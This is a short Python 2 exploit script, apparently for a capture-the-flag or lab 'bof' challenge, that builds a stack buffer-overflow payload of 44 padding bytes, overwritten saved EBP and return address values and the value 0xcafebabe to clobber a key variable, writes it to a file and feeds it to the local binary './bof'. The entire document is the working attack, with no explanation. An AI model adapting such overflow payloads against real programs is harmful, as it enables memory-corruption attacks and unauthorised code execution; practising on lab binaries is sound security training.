import struct
import os

output_file = './output_file.txt'
payload = ''
padding = "A" * 44
ebp = struct.pack ("I",0x11111111) # we can modify this value
ret_addr = struct.pack ("I",0x11111111) # we can modify this value, incase we want a safe shell exit
new_key = struct.pack ("I", 0xcafebabe)

payload += padding
payload += ebp
payload += ret_addr
payload += new_key

with open (output_file, "w") as f:
	f.write (payload)

print payload

os.system ("./bof" + " < {}".format (output_file))